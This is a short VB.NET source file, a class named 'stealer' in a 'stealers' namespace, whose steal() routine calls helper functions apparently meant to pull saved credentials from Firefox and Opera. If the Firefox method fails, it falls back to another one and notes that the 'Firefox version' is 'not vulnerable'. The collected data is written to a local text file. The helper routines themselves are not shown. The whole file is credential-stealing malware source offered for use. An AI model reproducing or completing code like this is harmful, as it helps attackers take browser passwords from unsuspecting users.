Imports System.IO


Namespace stealers


    Public Class stealer
        Public Sub Main()
            steal()
        End Sub
        Public Function steal() As String
            Dim toReturn As String
            toReturn = "asdf"
            'toReturn += Dark.GetChr + vbNewLine
            Try
                toReturn += Dark.GetFF() + vbNewLine
            Catch e As Exception
                toReturn += "Firefox version not vulnerable. " + vbNewLine
                toReturn += STFF.FF()
            End Try
            toReturn += Dark.GetOpera
            Dim sw As StreamWriter = New StreamWriter("testfile.txt")
            sw.Write(toReturn)
            Return toReturn
        End Function

    End Class
End Namespace
